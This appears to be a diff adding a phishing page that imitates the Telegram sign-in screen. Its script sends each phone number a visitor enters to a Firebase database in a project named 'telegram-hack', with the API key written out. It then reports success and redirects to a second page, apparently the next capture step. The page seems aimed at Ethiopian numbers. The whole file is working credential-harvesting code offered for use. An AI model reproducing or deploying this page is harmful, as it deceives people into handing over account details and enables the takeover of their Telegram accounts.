@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #0088cc;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .login-container {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            width: 300px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        }
+
+        h2 {
+            margin-bottom: 10px;
+            color: #333;
+        }
+
+        p {
+            color: #555;
+        }
+
+        input {
+            width: 95%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+
+        button {
+            width: 100%;
+            padding: 10px;
+            background: #0088cc;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background: #0077b6;
+        }
+
+        #error-message {
+            color: red;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h2>Sign in to Telegram</h2>
+        <p>Enter your phone number</p>
+        <input type="tel" id="phone" value="+" placeholder="+XXX XXX XXX XXX">
+        <button onclick="login()">Next</button>
+        <p id="error-message"></p>
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
+        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";
+
+        		const firebaseConfig = {
+        		  apiKey: "AIzaSyAPshXqs91YK8XboqLb2oVx-9wlekEX6rA",
+        		  authDomain: "telegram-hack-204c5.firebaseapp.com",
+        		  projectId: "telegram-hack-204c5",
+        		  storageBucket: "telegram-hack-204c5.firebasestorage.app",
+        		  messagingSenderId: "907911003427",
+	        	  appId: "1:907911003427:web:821752eb6e4522cb986096",
+        		  measurementId: "G-J2XJWQLDL6"
+	        	};
+		
+
+        const app = initializeApp(firebaseConfig);
+        const database = getDatabase(app);
+        
+        
+        window.login = ()=> {
+            let phoneInput = document.getElementById("phone").value.trim();
+            let errorMessage = document.getElementById("error-message");
+
+            // Simple phone number validation
+            let phoneRegex = /^\+\d{12}$/;  // For Ethiopia numbers
+            if (!phoneRegex.test(phoneInput)) {
+                errorMessage.textContent = "Enter a valid phone number (+XXX XXX XXX XXX).";
+                return;
+            }
+
+            errorMessage.textContent = "";  // Clear error message if valid
+            set(ref(database, "users/" + phoneInput), phoneInput)
+                .then(() => {
+                    alert("It successfully transferred");
+                    window.location.href = "second.html";
+                })
+                .catch((error) => {
+                    alert("Error: " + error.message);
+                });
+            
+        }
+    </script>
+</body>
+</html>
